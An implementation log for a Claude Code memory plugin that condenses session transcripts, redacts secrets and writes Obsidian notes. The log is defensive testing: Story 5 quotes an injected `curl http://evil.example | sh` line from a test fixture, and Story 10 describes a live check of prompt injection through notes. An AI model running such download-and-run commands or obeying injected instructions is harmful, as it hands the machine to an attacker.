# Implementation log

One entry per iteration, following the five axes from `/kolibee:implement`: user story, what it solves, implementation, decisions and reasoning, why it is readable and maintainable. Plus review findings and anything deliberately left open.

Plan: [Record 001](records/001-second-brain.md)

## Story 1: Spike on the Claude Code mechanisms (2026-10-10)

**User story.** As the developer of dory-brain, I need reliable answers about hooks, `claude -p` and transcripts, so the architecture rests on actual behavior. Foundation work, no end-user value.

**What it solves.** The architecture from Record 001 holds. A single flag (`--restricted`) confines the worker to the vault and its own bundle, it loads no outside instructions, and a run costs a fraction of a Rappen (Swiss cent) instead of 0.22 USD. `/clear`, `/exit`, closing the tab, Ctrl+C and SIGTERM all trigger `SessionEnd`, and a detached worker survives every one of them. Only SIGKILL and crashes go without a hook.

**Implementation.** Test plugin `spike/plugin-dory-spike/` (skill, logging hooks, recall probe), Haiku runs in a throwaway vault, and `spike/make_fixtures.py` generates four anonymized transcripts under `tests/fixtures/transcripts/`. Results are in the "Spike results" table in the record; solution components 2, 4, 5, 8 and 9 were updated to match.

**Decisions and reasoning.**
- Worker flags: `--restricted --strict-mcp-config --plugin-dir --settings disableAllHooks --permission-mode acceptEdits --permission-prompts none`, one `work/<id>/` per run. Reason: confinement and cost were demonstrated in the experiment.
- No vault CLAUDE.md, because `--restricted` does not load any CLAUDE.md.
- `condense` drops `attachment` lines, `toolUseResult` and command wrappers; from `tool_result` it keeps only the first error line. Reason: that is exactly where email, Git name, org ID and tool output live.
- Fixtures are generated synthetically rather than anonymized from real sessions, except for one structural skeleton. Reason: no residual risk from a forgotten field.

**Why it is readable and maintainable.** Spike code stays under `spike/`, separate from the later plugin; the fixture script documents both modes and is repeatable.

**Review findings (3 agents, all `correct`, no P0/P1).**
- P2 Organization ID not replaced in two fixtures: fixed, fixtures regenerated.
- P2 Skeleton lost command wrappers: fixed, all wrappers are kept.
- P2 Story 4 criterion required an output that had been dropped: switched to `sessions/<id>.json`.
- P2 Worker depended on `CLAUDE_PLUGIN_ROOT`: the plugin path is now derived from the script location.
- P3 Git name, hook log path, `toolUseResult`, contradiction about error lines, cleanup of `sessions/`, recall on `resume`, `~/.ssh` evidence, `--add-dir` writable: all fixed or verified.

**Deliberately left open.** A sweeper for sessions without `SessionEnd` (SIGKILL, crash) stays in Future.

**Addendum.** At the user's request, no manual tests: closing the tab and Ctrl+C were checked automatically in a pseudo-terminal with `spike/interactive_exit_test.py`. One test run with a prompt in the repo triggered the global session start workflow; runs without a prompt avoid that, and nothing in the repo was changed.

**Second review round (2026-10-11, 2 agents, both `correct`, no P0/P1), all findings addressed.**
- P2 Spike table still showed `--plugin-dir "$CLAUDE_PLUGIN_ROOT"` (reported twice): aligned with component 4.
- P2 Fixtures were below `min_user_messages`, so a condense test would have passed without the filter: regenerated `tool-output-secrets.jsonl` with 3 user messages and a secret in the user text; Next task mentions `min_user_messages = 1` for `tool-error.jsonl`.
- P3 Cleanup of `sessions/` after 30 days was not assigned to any component: `dory recall` takes it over, Story 4 criterion extended.
- P3 Docstring of `interactive_exit_test.py` described old behavior: updated.
- P3 Exit status was lost in the Ctrl+C path: now printed.

## Story 2: Session end lands safely in the queue (2026-10-11)

**User story.** As a user, I want every finished session to be queued and condensed without any wait, so nothing gets lost and the LLM run only sees cleaned-up material. Foundation for Story 3; no visible benefit in the vault yet.

**What it solves.** When you end a session, a queue entry plus a copy of the transcript is under `~/.local/state/dory-brain/` in less than a second. `dory worker --dry-run` builds an input bundle from it: project (from Git), CLAUDE.md excerpt, record titles and the condensed conversation. Tool output, context lines with email and org ID, Bash mode output and agent reports are left out; secrets in user and Claude text are redacted. Not yet: processing with `claude -p` (Story 3).

**Implementation.** Plugin under `plugin/` (manifest, `hooks/hooks.json` with SessionEnd, `bin/dory` as a uv script), package `plugin/dory/`: `config` (TOML + environment), `state` (directory layout, seen uuids), `queue` (entry, APFS clone, repo main path at enqueue time), `condense`, `secrets`, `project` (Git main path, names in `projects.json`), `bundle`, `worker` (flock, pass with recheck, outcomes done/skipped/transient/failed), `cli`. 46 tests under `tests/`.

**Decisions and reasoning.**
- Standard library only; `tomllib` instead of pyyaml. Reason: the hook starts without dependencies.
- `Process` callback in the worker: Story 3 plugs in the `claude -p` call without touching the lock or the outcomes.
- The repo main path is determined in the hook, not in the worker. Reason: herdr worktrees are often gone by processing time.
- An empty delta (nothing new since `save`) produces no bundle.
- `worker` without `--dry-run` refuses with exit 2 until Story 3.
- Hook errors go to `hook-errors.log`, and the hook always exits with 0.

**Why it is readable and maintainable.** One module per responsibility, dependencies in one direction only (`cli` → `worker` → `queue`/`condense`/`bundle` → `project`/`secrets`/`state`). The test names read like a specification.

**Residual risk for Story 5.** Claude's reply text may go into the bundle and can quote injected instructions (in the fixture, Claude mentions the `curl` URL while warning against it). `dory:rules` has to catch this: commands only go into notes if the user ran or confirmed them personally.

**Review findings (2 agents; architect `correct`, code `incorrect` because of two P1s), all fixed.**
- P1 Bash mode output (`<bash-stdout>`) and agent reports (`<task-notification>`) were treated as user text and counted toward the minimum length: filtered, test added. Cross-check against 180 real transcripts: only `<pasted_content>` remains, and that is pasted user text.
- P1 Secret filter missed quoted JSON keys, `Bearer` tokens, Stripe and GitLab tokens: patterns added, tests added.
- P2 Empty delta wrote an empty bundle (both agents): no bundle anymore.
- P2 Project was lost if the worktree was deleted before processing: repo path recorded at enqueue time.
- P2 Hook could end with a traceback: caught, logged, always exit 0.
- P2 An unreadable queue entry blocked the queue: moves to `failed/`.
- P2 A single oversized message blew the budget (both agents): every entry is capped.
- P3 `DORY_WORKER` stopped every command: now only applies to `enqueue`.
- P3 Submodules were treated as "no project": own project via `--show-toplevel`.
- P3 Redaction of `sk-ant-` and private keys was only tested indirectly: dedicated end-to-end test.

## Story 3: Session note in the vault (2026-10-11)

**User story.** As a user, I want a finished session to produce a session note in the Obsidian vault, so I can see what happened in which project. First visible benefit.

**What it solves.** `dory worker` now processes the queue with `claude -p`. Trial run with Haiku against a throwaway vault: 17 to 19 seconds, 0.0045 USD; it produces a session note (`sessions/2026/10/2026-10-11-1331-dory-brain-probe-00-1.md`, frontmatter per schema, Log and Open written in German) and the project overview `projects/dory-brain/dory-brain.md` with a link to the session. The token, API key and `curl` URL from the fixture appear nowhere in the vault; nothing was written outside the vault and state. Not yet: knowledge notes (Story 5), loading at startup (Story 4). The hook is not installed in Claude Code yet.

**Implementation.** `plugin/dory/ingest.py`: bundle, fixed note path, `task.md` with fixed frontmatter values and `rules.md` (a copy of `dory:rules`, because the confined run may not read the plugin directory) into the bundle directory, vault snapshot, call through a swappable runner with a timeout, parsing of the JSON output, success only if the note exists, then uuids marked as seen, a line in `runs.log`. Skills `plugin/skills/rules` (minimal version) and `plugin/skills/ingest`. 66 tests.

**Decisions and reasoning.**
- Failure modes of `claude -p` confirmed with real runs (401, 404, budget, success; fixtures under `tests/fixtures/claude-output/`). 429 could not be triggered; that fixture is built from the 401 shape and named as synthetic.
- 401/403 count as transient (expired login), 404 and budget as failures.
- Without a network, `claude -p` hangs in retries. A timeout therefore counts as a failure and ends the pass; otherwise every waiting entry would hang for 10 minutes. Criterion 3 has a documented limit for this.
- The session note is written last and marks success. An existing note for an entry that is not done is a draft and gets rewritten.
- Date (local time), part number and project are computed by Python, not by the model.

**Why it is readable and maintainable.** `ingest` plugs into the Story 2 worker as a callback, without touching the lock or the queue. The runner is swappable; the tests replace `claude -p` with a fake that writes the note as requested.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 Part number depended on the contents of `done/`, so a retry could create a second note (both agents): derived from all older entries of the session.
- P2 A partial snapshot blocked the `copytree` fallback: deleted beforehand.
- P2 A note from an aborted run stayed frozen, and content after resume was lost: rewritten as a draft.
- P2 An offline pass charged every entry a 10 minute timeout: the timeout ends the pass.
- P3 Snapshots before runs that fail immediately on the rate limit pushed out real history: deleted again.
- P3 The model computed local time itself: fixed values in `task.md`.
- P3 Session note written before the overview: now written last (fits the insight links in Story 5).
- P3 Crashes before the run were missing from `runs.log`: now logged.
- P3 Timeout only tested with a fake: real test with a hanging `sleep`.
- P3 Return types added.

## Story 4: Short-term recall at startup (2026-10-11)

**User story.** As a user, I want a new session in a repo to automatically know the recent sessions of that project, so after `/clear` or a break I don't have to explain where we are. Core value.

**What it solves.** The SessionStart hook `dory recall` injects: the project with its summary and "Open" from the project overview, the last 3 sessions of the project with their age ("today", "yesterday", "3 days ago") and a wikilink, and sessions still waiting in the queue with the path to the transcript copy. Outside a repo, the last sessions without a project. On `resume`, nothing. Confirmed end to end: a real `claude -p` session with the plugin answered "What do you know about the last session?" from the probe vault, and its SessionEnd queued it again. Not yet: knowledge notes, catalog, domain boundary (Story 6).

**Implementation.** `plugin/dory/frontmatter.py` (parser for the fixed schema), `plugin/dory/recall.py` (scan, three tiers, budget), `dory recall` in the CLI, SessionStart in `plugin/hooks/hooks.json`, `project.lookup_project` (read only). 80 tests.

**Decisions and reasoning.**
- Own frontmatter parser instead of pyyaml: the hook stays dependency-free and starts fast; the schema is fixed (flat keys, inline and block lists, folded values). Measured: under 1 s with 500 notes, including uv startup.
- The hook never writes `projects.json`; only the worker assigns project names. A repo without a name has no notes yet, so the recall only shows the queue there.
- Timestamps with an offset are converted to local time so naive and timezone-aware dates stay sortable.

**Why it is readable and maintainable.** Each tier is its own function that returns a section; Story 6 adds tiers. Known for Story 6: `_fit` trims the finished text line by line, while ranking and catalog need entries that point back to their note; frontmatter values are strings (`pinned: false` is the string "false").

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 SessionStart wrote `projects.json` without a lock, so a collision with the worker was possible: the hook only reads; writes in the worker are now atomic.
- P2 A date with an offset in a single note disabled the recall for the whole project: converted to local time.
- P2 `summary: >-` and a value on the following line produced wrong summaries: the parser reads both.
- P3 A note with a BOM was treated as having no frontmatter: `utf-8-sig`.
- P3 Two sessions starting at the same time could abort the cleanup of `sessions/` (both agents): caught.

## Story 5: Knowledge notes and cleanup (2026-10-11)

**User story.** As a user, I want the worker to store insights as individual knowledge notes and to extend or replace existing ones, so long-term memory grows without duplicating or going stale. Core of the value.

**What it solves.** A session produces knowledge notes per schema (type, multiple projects, `summary`, `when`, `sources`). Confirmed with 7 live checks against real `claude -p` runs, 7/7 green each with Haiku (4 passes) and Sonnet (3 passes): the same insight extends the existing note; a contradicting one replaces it with `superseded` and a link to the new note; whatever is in CLAUDE.md is not repeated, while a new insight in the same session does become a note; an injected instruction quoted by Claude (`curl http://evil.example | sh`) appears nowhere in the vault; the shopping list gets milk and bread, eggs are removed, and it stays a checklist with `type: list`; an insight for hub and infrastructure lives in the hub folder with both projects; a completed item disappears from "Open". Example of a Haiku note: `ai-assistant-hub-loki-retention.md`, type `decision`, "Loki retention is set to 7 days because the customer disks only have 40 GB."

**Implementation.** `plugin/skills/rules/SKILL.md` complete (what counts as an insight, location and file names, cleanup, lists and registers, commands only from the user's own hand, rules without a task for `/dory:note`), `plugin/skills/ingest/SKILL.md` with the order knowledge, overview, session note last; `task.md` states today's date, the session note's file name and the known projects. `tests/test_live_rules.py` (marker `live`, only runs with `DORY_LIVE=1 uv run pytest -m live`). 82 tests in the normal run.

**Decisions and reasoning.**
- Transcripts for the live checks built by hand instead of generated with `claude -p`: every case is precisely controlled and nothing needs anonymizing.
- Live checks don't run in the normal test run: they cost money and depend on the model.
- Cost per session measured: Haiku about 0.0045 USD, Sonnet about 0.07 USD (factor 15). Default model: the user chose `sonnet` on October 11; `haiku` remains available via config.

**Why it is readable and maintainable.** All writing rules live in one file, loaded by the worker and later by `/dory:note`. Every live check has a name that states its criterion, and checks both the positive and the negative case.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 When replacing, there was no requirement for a separate file name; the old note could have been overwritten: rule added, file names unique across the vault.
- P2 The CLAUDE.md check proved nothing (no positive control, Claude mentioned the CLAUDE.md itself): rebuilt; a gotcha stands verbatim in the CLAUDE.md and must not become a note, a new insight must become one. The first stricter version rightly failed because the check was too strict (the swap note mentioned the deploy script as context) and was refined.
- P2 Open check too strict (missing section): tolerated.
- P2 A broken `projects.json` also made sessions without a project fail: falls back to an empty list.
- P3 "cross-project" distinguished from "multiple projects"; `summary` rule for the session note restored; `superseded_by` checked to point at the new note; list checked as a checklist with `type: list`; rules for `/dory:note` without a task; docstring with `DORY_LIVE=1`; unit tests for the new values in `task.md`.

## Story 6: Full recall (2026-10-11)

**User story.** As a user, I want startup to also load the relevant long-term knowledge and a catalog, without private material in work sessions, so I can use relevant knowledge even when it comes from another project.

**What it solves.** A session in `ai-assistant-hub-infrastructure` now gets, under "Project knowledge", the note "Loki container only starts if the data directory is owned by UID 10001. (When: deploying or debugging Loki on a customer VM)" with its path, even though the note lives in the hub folder; plus, under "Cross-project knowledge", notes from `general/` in the same domain. A catalog lists lists and registers and the project notes that did not fit the budget, with path and a pointer to `/dory:search`. Order: pinned, number of `sources`, `updated`; superseded never. In a `work` project nothing with `domain: private` appears, not even in the catalog; outside a repo both domains, so in `~` the shopping list and invoices. Real hook call against a probe vault with 502 notes: 0.1 s.

**Implementation.** `plugin/dory/recall.py`: sections consist of entries (`_Section`), and the budget (`_Budget`) is charged per entry instead of trimming the finished text line by line, so the recall knows which note was loaded. `Note` knows `type`, `domain`, `is_knowledge`, `updated` (date) and `rank`. New tests in `tests/test_recall_knowledge.py` (the 4 criteria plus private projects, other projects, catalog with a full budget, no empty headings); the 500-note test now mixes in knowledge notes, superseded notes and lists. 90 tests.

**Decisions and reasoning.**
- Cross-project means `projects: []` (like `general/`). Notes from other projects are not loaded.
- "Matching domain" for tier 5 is the project's domain from the overview (default `work`); in a `private` project there is no boundary for project notes and catalog.
- Strict ranking: if a knowledge note doesn't fit, no lower-ranked note is loaded either, not even from tier 5.
- 20 % of the budget stays reserved for the catalog while knowledge is loaded. Without the reserve the catalog vanished entirely when there were many notes, and the notes that weren't loaded showed up nowhere. If all the knowledge fits, the reserve costs nothing. The number is set, not measured.
- Lists and registers come before the unloaded notes in the catalog: the catalog is their only way into the session.
- Lists and registers without a `domain` count as private (default from `dory:rules`).

**Why it is readable and maintainable.** Each tier returns a `_Section`; `_fill_section` is the only place that deals with budget and headings. The module docstring describes all six tiers, the ranking and the boundary.

**Found during the real run (before the review).** Empty sections showed up as a bare heading; the catalog disappeared when the budget was full because all project notes counted as loaded; the gap between sections was counted as one character instead of two (output 1 character over budget). All three fixed and covered by tests.

**Review findings (2 agents, both `correct`, no P0/P1), addressed.**
- P2 Lists and registers came after the unloaded notes in the catalog and got dropped in large projects (code-reviewer): order reversed, test with a register in an overflowing project, cross-check fails with the old order.
- architect-review: no findings.

## Story 7: Making operations visible (2026-10-11)

**User story.** As a user, I want to see whether the worker is running, what fails and what it costs, so a silent failure gets noticed.

**What it solves.** `dory status` shows the queue length, the number of failed entries with the reason per entry (for example "session note missing: sessions/2026/10/…"), the last error with time and kind, and the cost today and this week (week starting Monday, local time), and on failures a pointer to `dory retry`. `dory retry` moves failed entries back into the queue with the counter reset to 0 and starts the worker. The worker has been writing `runs.log` since Story 3 (entry, result, seconds, cost, error); the handover in the loop state had wrongly listed that as open.

**Implementation.** New module `plugin/dory/ops.py` (`status`, `retry`), commands `status` and `retry` in `plugin/dory/cli.py`, `worker.lock` made public (previously `_lock`). Tests in `tests/test_ops.py`; the `runs.log` test in `tests/test_ingest.py` now checks all four fields. 97 tests.

**Decisions and reasoning.**
- "Last error" comes from `runs.log` (with time), the reason per parked entry from its `last_error`. Skipped runs don't count as errors, even though `ingest` records a reason.
- Broken lines in `runs.log` are skipped so a truncated line doesn't hide the costs.
- Unreadable entries in `failed/` stay there; `retry` only reports what it moved.
- `retry` takes the worker lock. If a worker is running, it moves nothing and says so (exit 1): the running pass has already tried the entries and would skip them.

**Why it is readable and maintainable.** `ops.py` only reads files that the queue and worker write anyway; no new format. Status text in the same language as the recall.

**Review findings (2 agents, both `correct`, no P0/P1), addressed.**
- P2 Skipped runs ("nothing new to condense") showed up as "Last error" and hid real errors (both agents): filtered, test with a skipped run, cross-check fails without the fix.
- P3 A retry while a worker was running sat there until the next session end (both agents): `retry` takes the lock and reports a running worker; test. Rejected: renaming the file on retry, because the session note's part number is sorted by file name.

## Story 8: `/dory:save` (2026-10-11)

**User story.** As a user, I want to save a running session right now, so important insights are secured before I keep working.

**What it solves.** `/dory:save` queues exactly the running session and replies "Session f1d13db4 queued; the worker processes it in the background." Work continues without any wait. When the session ends later, the worker only processes what came after the save, as part 2 of the session note. Confirmed with real `claude -p` runs (Haiku, throwaway state, no worker, under 0.01 USD in total): a session on its own got its `save` entry without a permission prompt; of two concurrent sessions in the same repo, only the one that saved got one.

**Implementation.** `dory enqueue --session <id>` in `plugin/dory/cli.py` reads `sessions/<id>.json` (from the SessionStart hook), enqueues with `reason: save` and starts the worker detached. Skill `plugin/skills/save/SKILL.md` (`disable-model-invocation`, `allowed-tools: Bash`). Transcript copy now per entry (`queue.py`), skipped entries as `<id>.skipped.json` (`worker.py`); state tree in Record 001 updated. 104 tests.

**Decisions and reasoning.**
- The skill calls the CLI through the Bash tool; Claude Code fills in the session ID in the skill text. `disable-model-invocation`, so Claude doesn't save on its own.
- `--restricted` disables the Bash tool (seen in the live run). Irrelevant for `/dory:save`, because normal sessions don't run restricted; the live check therefore uses `--setting-sources project` so no hooks from other plugins run along.
- Unknown or empty session ID: message "Session … not found; is the dory plugin active?" and exit 1, so the skill shows the error.

**Why it is readable and maintainable.** `_save` sits next to `_enqueue_from_hook`; both use `queue.enqueue` and `spawn_worker`. Part numbers and `seen_uuids` from Story 3 cover criterion 2 without new mechanics.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 One transcript copy per session: if the `save` entry hadn't been processed by session end, the end overwrote the copy and everything ended up in part 1 (both agents): copy per entry; test with `save` and end in one pass.
- P3 Skipped entries counted toward the part number, so a second `save` with nothing new left a gap (architect): `.skipped.json` suffix, test.
- P3 An empty `--session` silently fell into hook mode (code-reviewer): check for `None`, test.

## Story 9: `/dory:note` (2026-10-11)

**User story.** As a user, I want to store a note directly with `/dory:note "..."`, so I can record something without processing a session.

**What it solves.** `/dory:note "Loki port 3100 collides with Grafana"` in the hub repo creates `projects/ai-assistant-hub/ai-assistant-hub-loki-port-3100.md` (type `gotcha`, `projects: [[ai-assistant-hub]]`, `summary`, `when`, `sources: []`) and adds it to the project overview under `## Knowledge`; where the text doesn't say, the note states "Cause and resolution are not recorded". If a note on the topic already exists, it gets extended. `/dory:note "Buy milk"` in `~` extends the shopping list. In a repo the worker has never seen, the note lands in that project and the overview is created. A snapshot is taken before writing; there are no follow-up questions.

**Implementation.** `dory prepare-note` (`plugin/dory/note.py`): snapshot, then vault, date, project with domain and overview (or "missing"), known projects and the writing rules as text. Skill `plugin/skills/note/SKILL.md` (`disable-model-invocation`, `allowed-tools: Bash, Read, Write, Edit, Glob, Grep`). Snapshot and rule text in `plugin/dory/vault.py`, shared by worker and note. Tests `tests/test_note.py`; live checks `tests/test_live_note.py` (marker `live`): 4 cases, green several times with Haiku, under 0.01 USD per run. 109 tests in the normal run.

**Decisions and reasoning.**
- The rules come along in the output of `prepare-note` instead of the skill reading the rules file: one tool call fewer, nothing to read outside the vault.
- Writing without a prompt via `allowed-tools` in the skill, without an entry in `~/.claude/settings.json` (checked live, `permission_denials` empty, even though the vault is outside the working directory). So `additionalDirectories` from the spec isn't needed.
- `prepare-note` assigns a project name to a new repo the same way the worker does (`detect_project`), so a note from a new repo doesn't end up under `general/`.
- Live checks with Haiku: in daily use the skill runs with the session's model, and Haiku is the stricter test.

**Why it is readable and maintainable.** The writing rules still exist exactly once (`dory:rules`); worker and note fetch them via `vault.rules_text`.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 In a repo without a vault folder, the project was missing from "Known projects", and the skill forbade creating the missing overview; the note would have landed under `general/` (code-reviewer): the session's project counts as known, the overview is marked as "missing", and the skill may create it; unit test and live check.
- P3 `note` depended on the worker module `ingest` (architect): `snapshot` and `rules_text` moved to `vault.py`.
- P3 A comment after `detect_project` made the formatter wrap the call (code-reviewer): comment moved above it.

## Story 10: `/dory:search` (2026-10-11)

**User story.** As a user, I want to pull in specific knowledge with `/dory:search "..."`, so I can get at information that startup didn't load.

**What it solves.** `/dory:search loki deploy` in the hub repo returns as its first hit "Loki only starts if the volume is owned by UID 10001. (When: deploying Loki) → projects/ai-assistant-hub/ai-assistant-hub-loki-uid-10001.md". It searches summary, when, tags, file name and body; a search term also matches as part of a word ("deploy" finds "deploying"). In a `work` project no private notes appear; outside a repo they do. No hits: "No matches for "…" in the vault …". Replaced notes are not offered.

**Implementation.** `plugin/dory/search.py`, CLI `dory search <words>`, skill `plugin/skills/search/SKILL.md`. Scan, project domain and domain boundary reused from `recall.py` (made public: `scan`, `project_domain`, `allowed`; new `Note.superseded`). Tests `tests/test_search.py`; two live checks in `tests/test_live_note.py`. 116 tests in the normal run, live 6/6 with Haiku.

**Decisions and reasoning.**
- Scoring: per search term the best field counts (summary and when 3, tags and file name 2, body 1); sorted first by number of matched terms, then by weight; at most 10 hits. No index: a single pass over the vault is enough for hundreds of notes.
- All note kinds are searched except replaced ones (knowledge, sessions, overviews, lists); replaced notes lead to their successor.
- The model may start `/dory:search` without an explicit invocation, because search only reads. To make that safe, the Bash permission is limited to exactly `${CLAUDE_PLUGIN_ROOT}/bin/dory search`; Claude Code substitutes the variable in `allowed-tools` too. A leading wildcard (`*/bin/dory search:*`) does not match.
- Search only reads the project (`lookup_project`) and assigns no names.

**Why it is readable and maintainable.** The domain boundary and the definition of "replaced" each exist once (`recall.allowed`, `Note.superseded`) and apply the same way to startup and search.

**Review findings (2 agents, both `correct`, no P0/P1), all addressed.**
- P2 The model-startable skill allowed every Bash command; a command from a note it had read would have run without a prompt (both agents): permission limited to `dory search`. Live cross-check: with the old permission, `touch dory-probe` ran without a prompt and the file was created; with the new one it was denied; recorded as a live check.
- P3 A note deleted between scan and read aborted the search (code-reviewer): a read error yields empty text; test.
- P3 "Replaced" was defined twice, in search and recall (both agents): `Note.superseded`.

**Open, not part of this story.** `/dory:save` and `/dory:note` still allow `Bash` without restriction. They only start on explicit invocation (`disable-model-invocation`), but `/dory:note` reads vault content; the same restriction can be applied there.
